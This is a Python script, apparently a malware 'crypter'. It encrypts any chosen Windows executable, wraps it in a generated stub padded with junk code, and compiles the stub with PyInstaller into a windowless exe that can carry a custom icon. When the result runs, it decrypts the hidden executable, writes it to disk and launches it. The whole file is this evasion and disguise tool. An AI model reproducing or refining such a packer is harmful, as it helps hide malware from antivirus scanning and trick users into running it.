from cryptography.fernet import Fernet
from tkinter import filedialog
import os


def main(origin_file, new_file_name, icon):
    with open(origin_file, "rb")as file:
        origin_file_content = file.read()
    encrypted_text, key = encryption(origin_file_content)
    pseudo_text = """from os import startfile
from cryptography.fernet import Fernet


def main(dbr1, iol):
    file_name = "Datei.exe"
    x = 12
    while x < 20:
        n = 0
        x += 1
    with open(file_name, "wb")as file:
        file.write(decryption(iol, dbr1))
    startfile(file_name)


def decryption(text_to_decrypt, dbr2):
    method = Fernet(dbr2)
    d = "daccada"
    d += "jiejd3j02"
    elephant = method.decrypt(text_to_decrypt)
    return elephant


dbr = {}
string = {}
main(dbr, string)
""".format(key, encrypted_text)
    with open(new_file_name, "w")as n:
        n.write(pseudo_text)
    if icon is None:
        os.system(f"Pyinstaller -F -w {new_file_name}")
    else:
        print(f"Pyinstaller -i {icon} -F -w {new_file_name}")
        os.system(f"Pyinstaller -i {icon} -F -w {new_file_name}")
    os.remove(new_file_name)


def encryption(origin_file_content):
    key = Fernet.generate_key()
    encrypt_method = Fernet(key)
    encrypted_text = encrypt_method.encrypt(origin_file_content)
    return encrypted_text, key


if __name__ == '__main__':
    f = filedialog.askopenfilename(filetypes=(("exe files", "*.exe"), ("all files", "*.*")))
    new_file_name = input("Name of new File(without .py): ")
    new_file_name += ".py"
    icon_input = input("Custom Icon(.ico)(Y/N): ")
    if icon_input == "Y" or icon_input == "y":
        icon = filedialog.askopenfilename(filetypes=(("ico files", "*.ico"), ("all files", "*.*")))
    else:
        icon = None
    main(f, new_file_name, icon)